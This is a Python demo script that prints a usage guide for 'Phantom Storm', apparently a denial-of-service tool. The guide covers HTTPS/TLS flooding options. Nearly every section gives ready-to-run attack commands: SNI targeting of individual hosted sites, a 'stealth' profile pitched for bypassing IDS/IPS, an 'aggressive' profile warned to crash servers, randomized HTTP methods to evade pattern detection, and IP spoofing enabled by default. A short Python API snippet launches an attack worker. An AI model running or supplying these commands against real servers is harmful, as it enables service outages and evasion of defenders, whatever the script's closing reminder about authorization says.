#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
HTTPS Attack Demo - Showcase TLS/HTTPS attack capabilities

This example demonstrates Feature #3: TLS/HTTPS Support including:
1. HTTP vs HTTPS comparison
2. TLS version selection
3. SNI (Server Name Indication)
4. Certificate verification options
5. Combined with other features (profiles, methods, spoofing)

Usage:
    python examples/https_attack_demo.py
"""

import sys
import os

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from src.core.tls_handler import TLSConfig, TLSHelper, TLSVersion

def main():
    print("="*80)
    print(" PHANTOM STORM - TLS/HTTPS ATTACK DEMONSTRATION ".center(80))
    print("="*80)
    
    print("\n📋 Feature #3: TLS/HTTPS Support\n")
    
    # Check available TLS versions
    print("🔐 Available TLS Versions:")
    versions = TLSHelper.get_available_tls_versions()
    for version in versions:
        print(f"   • {version}")
    
    print("\n" + "="*80)
    print(" 1. BASIC HTTPS ATTACK ".center(80))
    print("="*80)
    
    print("\n💡 Simplest HTTPS attack with default settings:\n")
    print("Command:")
    print("   python phantom_storm_v2.py 192.168.1.100 443 200 --https")
    
    print("\nWhat happens:")
    print("   • Connects to port 443 (HTTPS)")
    print("   • Uses SSL/TLS encryption")
    print("   • Auto-selects best TLS version (AUTO)")
    print("   • Disables certificate verification (for self-signed certs)")
    print("   • Works with IP spoofing by default")
    
    print("\n" + "="*80)
    print(" 2. HTTPS WITH SNI (Server Name Indication) ".center(80))
    print("="*80)
    
    print("\n💡 Use SNI for virtual hosting (multiple domains on one IP):\n")
    print("Command:")
    print("   python phantom_storm_v2.py 192.168.1.100 443 200 --https --sni=www.example.com")
    
    print("\nWhy SNI?")
    print("   • Server hosts multiple SSL sites on one IP")
    print("   • SNI tells server which certificate to use")
    print("   • Required for many modern HTTPS servers")
    print("   • Essential for CDN and shared hosting attacks")
    
    print("\nExample scenario:")
    print("   Target: 192.168.1.100 hosts www.site1.com and www.site2.com")
    print("   Command: --https --sni=www.site1.com → attacks site1")
    print("   Command: --https --sni=www.site2.com → attacks site2")
    
    print("\n" + "="*80)
    print(" 3. TLS VERSION SELECTION ".center(80))
    print("="*80)
    
    print("\n💡 Test specific TLS versions to find vulnerabilities:\n")
    
    print("Available TLS versions:")
    print("   • TLS_1_0 - Old, many vulnerabilities")
    print("   • TLS_1_1 - Deprecated")
    print("   • TLS_1_2 - Current standard")
    print("   • TLS_1_3 - Latest, most secure")
    print("   • AUTO    - Let client choose (default)")
    
    print("\nCommands:")
    print("   # Force TLS 1.2")
    print("   python phantom_storm_v2.py 192.168.1.100 443 200 --https --tls-version=TLS_1_2")
    
    print("\n   # Force TLS 1.3 (if supported)")
    print("   python phantom_storm_v2.py 192.168.1.100 443 200 --https --tls-version=TLS_1_3")
    
    print("\n   # Test old TLS 1.0 (check if server still supports it)")
    print("   python phantom_storm_v2.py 192.168.1.100 443 200 --https --tls-version=TLS_1_0")
    
    print("\nUse cases:")
    print("   ✓ Check if server accepts old TLS versions (security audit)")
    print("   ✓ Test TLS downgrade attack resistance")
    print("   ✓ Force specific version for compatibility testing")
    
    print("\n" + "="*80)
    print(" 4. CERTIFICATE VERIFICATION ".center(80))
    print("="*80)
    
    print("\n💡 Control SSL certificate verification:\n")
    
    print("Default behavior:")
    print("   • Certificate verification DISABLED")
    print("   • Works with self-signed certificates")
    print("   • Good for lab environments")
    
    print("\nEnable verification:")
    print("   python phantom_storm_v2.py 192.168.1.100 443 200 --https --verify-ssl")
    
    print("\nWhen to enable --verify-ssl:")
    print("   ✓ Testing production servers with valid certificates")
    print("   ✓ Realistic attack simulation")
    print("   ✓ Check if invalid certs are rejected")
    
    print("\nWhen to disable (default):")
    print("   ✓ Lab environments with self-signed certificates")
    print("   ✓ Internal testing servers")
    print("   ✓ Development environments")
    
    print("\n" + "="*80)
    print(" 5. HTTPS + ATTACK PROFILES ".center(80))
    print("="*80)
    
    print("\n💡 Combine HTTPS with attack profiles:\n")
    
    print("Stealth HTTPS attack:")
    print("   python phantom_storm_v2.py 192.168.1.100 443 50 --profile=stealth --https")
    print("   • Slow, hard to detect")
    print("   • Uses HTTPS encryption")
    print("   • Good for bypassing IDS/IPS")
    
    print("\nBalanced HTTPS attack:")
    print("   python phantom_storm_v2.py 192.168.1.100 443 150 --profile=balanced --https")
    print("   • Standard testing")
    print("   • HTTPS with moderate speed")
    
    print("\nAggressive HTTPS attack:")
    print("   python phantom_storm_v2.py 192.168.1.100 443 300 --profile=aggressive --https")
    print("   • Maximum impact")
    print("   • Fast HTTPS connection exhaustion")
    print("   ⚠️ WARNING: Can crash servers!")
    
    print("\n" + "="*80)
    print(" 6. HTTPS + HTTP METHODS ".center(80))
    print("="*80)
    
    print("\n💡 Combine HTTPS with different HTTP methods:\n")
    
    print("HTTPS POST attack:")
    print("   python phantom_storm_v2.py 192.168.1.100 443 200 --https --method=POST")
    print("   • Heavier load (POST with body)")
    print("   • HTTPS encryption")
    
    print("\nHTTPS Random methods:")
    print("   python phantom_storm_v2.py 192.168.1.100 443 200 --https --random-method")
    print("   • Harder to detect patterns")
    print("   • HTTPS with method diversity")
    
    print("\nHTTPS HEAD (lightweight):")
    print("   python phantom_storm_v2.py 192.168.1.100 443 200 --https --method=HEAD")
    print("   • Minimal bandwidth")
    print("   • Fast HTTPS connections")
    
    print("\n" + "="*80)
    print(" 7. COMPLETE FEATURE COMBO ".center(80))
    print("="*80)
    
    print("\n💡 Combine ALL features for ultimate attack:\n")
    
    print("Command:")
    print("   python phantom_storm_v2.py 192.168.1.100 443 200 \\")
    print("       --https \\")
    print("       --sni=www.target.com \\")
    print("       --tls-version=TLS_1_2 \\")
    print("       --profile=balanced \\")
    print("       --random-method")
    
    print("\nThis combines:")
    print("   ✓ HTTPS/TLS encryption")
    print("   ✓ SNI for correct virtual host")
    print("   ✓ Specific TLS version")
    print("   ✓ Balanced attack profile")
    print("   ✓ Random HTTP methods")
    print("   ✓ IP spoofing (default)")
    
    print("\n" + "="*80)
    print(" 8. HTTP vs HTTPS COMPARISON ".center(80))
    print("="*80)
    
    print("\n📊 Understanding the differences:\n")
    
    print("┌─────────────────────────────────────────────────────────────┐")
    print("│ Feature              │ HTTP (Port 80)  │ HTTPS (Port 443) │")
    print("├──────────────────────┼─────────────────┼──────────────────┤")
    print("│ Encryption           │ None            │ TLS/SSL          │")
    print("│ Certificate          │ Not needed      │ Required         │")
    print("│ Connection overhead  │ Low             │ Higher           │")
    print("│ TLS handshake        │ No              │ Yes              │")
    print("│ Resource usage       │ Lower           │ Higher           │")
    print("│ Detection difficulty │ Easier          │ Harder           │")
    print("│ Modern websites      │ Rare            │ Standard         │")
    print("└──────────────────────┴─────────────────┴──────────────────┘")
    
    print("\nWhen to use HTTP:")
    print("   • Testing old servers")
    print("   • Internal network only")
    print("   • Lower resource usage")
    
    print("\nWhen to use HTTPS:")
    print("   • Modern websites (most common)")
    print("   • Production environments")
    print("   • Realistic attack scenarios")
    print("   • CDN and load balancer testing")
    
    print("\n" + "="*80)
    print(" 9. LAB TESTING SCENARIOS ".center(80))
    print("="*80)
    
    print("\n🧪 Recommended testing sequence:\n")
    
    print("Step 1: Basic HTTP (baseline):")
    print("   python phantom_storm_v2.py 192.168.1.100 80 100")
    
    print("\nStep 2: Basic HTTPS:")
    print("   python phantom_storm_v2.py 192.168.1.100 443 100 --https")
    
    print("\nStep 3: HTTPS with SNI:")
    print("   python phantom_storm_v2.py 192.168.1.100 443 100 --https --sni=www.labpentest.vn")
    
    print("\nStep 4: HTTPS Stealth attack:")
    print("   python phantom_storm_v2.py 192.168.1.100 443 50 --https --profile=stealth")
    
    print("\nStep 5: HTTPS Aggressive attack (⚠️ careful!):")
    print("   python phantom_storm_v2.py 192.168.1.100 443 300 --https --profile=aggressive")
    
    print("\n" + "="*80)
    print(" 10. TROUBLESHOOTING ".center(80))
    print("="*80)
    
    print("\n🔧 Common issues and solutions:\n")
    
    print("❌ Issue: 'SSL handshake failed'")
    print("   ✓ Solution: Check if server actually uses HTTPS")
    print("   ✓ Command: telnet 192.168.1.100 443")
    
    print("\n❌ Issue: 'Certificate verification failed'")
    print("   ✓ Solution: Disable verification for self-signed certs")
    print("   ✓ Don't use --verify-ssl flag (verification disabled by default)")
    
    print("\n❌ Issue: 'Invalid TLS version'")
    print("   ✓ Solution: Check available versions")
    print("   ✓ Use: --tls-version=AUTO (default)")
    
    print("\n❌ Issue: Low success rate with HTTPS")
    print("   ✓ Solution: HTTPS requires more resources")
    print("   ✓ Reduce thread count or use Stealth profile")
    
    print("\n" + "="*80)
    print(" PYTHON API USAGE ".center(80))
    print("="*80)
    
    print("\n📝 Using HTTPS in Python code:\n")
    
    code_example = '''
from src.core import AttackWorker
from src.core.tls_handler import TLSConfig
from src import AttackStatistics

# Create TLS config
tls_config = TLSConfig(
    use_https=True,
    verify_ssl=False,
    tls_version="TLS_1_2",
    sni_hostname="www.example.com"
)

# Create worker with HTTPS
stats = AttackStatistics()
worker = AttackWorker(
    target_ip="192.168.1.100",
    target_port=443,
    stats=stats,
    worker_id=1,
    tls_config=tls_config
)

# Run attack
worker.run()
'''
    print(code_example)
    
    print("\n" + "="*80)
    print(" SECURITY CONSIDERATIONS ".center(80))
    print("="*80)
    
    print("\n⚠️ Important notes:\n")
    
    print("1. HTTPS adds CPU overhead:")
    print("   • TLS handshake is computationally expensive")
    print("   • Both attacker and target use more CPU")
    print("   • May need fewer threads for same impact")
    
    print("\n2. Certificate verification:")
    print("   • Disabled by default for lab compatibility")
    print("   • Enable for realistic production testing")
    print("   • Self-signed certs will fail if verified")
    
    print("\n3. SNI is important:")
    print("   • Many servers require SNI")
    print("   • Without SNI, may get wrong certificate")
    print("   • Use --sni for virtual hosting")
    
    print("\n4. TLS version matters:")
    print("   • Old versions (TLS 1.0/1.1) may be blocked")
    print("   • TLS 1.3 may not work on old servers")
    print("   • AUTO is safest choice")
    
    print("\n" + "="*80)
    print(" KEY TAKEAWAYS ".center(80))
    print("="*80)
    
    print("\n✅ Summary:\n")
    print("   1. Use --https for HTTPS/TLS attacks")
    print("   2. Add --sni=HOSTNAME for virtual hosting")
    print("   3. Choose TLS version with --tls-version")
    print("   4. Disable cert verification by default (good for labs)")
    print("   5. Combine with profiles and methods")
    print("   6. HTTPS uses more resources (fewer threads needed)")
    print("   7. Most modern websites require HTTPS")
    
    print("\n" + "="*80)
    print("\n🚀 Ready to test HTTPS attacks!")
    print("\n⚠️  Remember: Always get written authorization first!\n")
    print("="*80)

if __name__ == "__main__":
    main()
